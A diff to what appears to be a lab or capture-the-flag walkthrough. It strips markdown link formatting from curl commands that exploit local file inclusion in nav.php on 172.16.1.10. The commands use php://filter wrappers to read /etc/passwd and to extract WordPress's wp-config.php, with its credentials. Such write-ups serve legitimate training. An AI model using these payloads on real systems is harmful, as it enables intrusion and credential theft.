@@ -4,7 +4,7 @@ The default Apache page is present on the web root. Loading the WordPress index 
 
 ```bash
 # Verify WordPress installation in the web root via LFI
-curl -s "[http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php](http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php)"
+curl -s http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php
 ```
 * Tool: cURL
 
@@ -16,13 +16,13 @@ The `php://filter` wrapper is highly effective for Local File Inclusion (LFI) be
 
 ```bash
 # Extract /etc/passwd using base64 encoding filter
-curl -s "[http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd](http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd)"
+curl -s http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
 ```
 * Tool: cURL / PHP Filter
 
 ```bash
 # Extract /etc/passwd using ROT13 encoding filter
-curl -s "[http://172.16.1.10/nav.php?page=php://filter/read=string.rot13/resource=/etc/passwd](http://172.16.1.10/nav.php?page=php://filter/read=string.rot13/resource=/etc/passwd)"
+curl -s http://172.16.1.10/nav.php?page=php://filter/read=string.rot13/resource=/etc/passwd
 ```
 * Tool: cURL / PHP Filter
 
@@ -32,7 +32,7 @@ Apply the base64 encoding filter to the LFI payload to safely extract the `wp-co
 
 ```bash
 # Fetch wp-config.php via LFI, base64 decode the stream, and output to a local file
-curl -s "[http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php](http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php)" | base64 -d > wpconfig.php
+curl -s http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php | base64 -d > wpconfig.php
 ```
 * Tool: cURL / base64
 
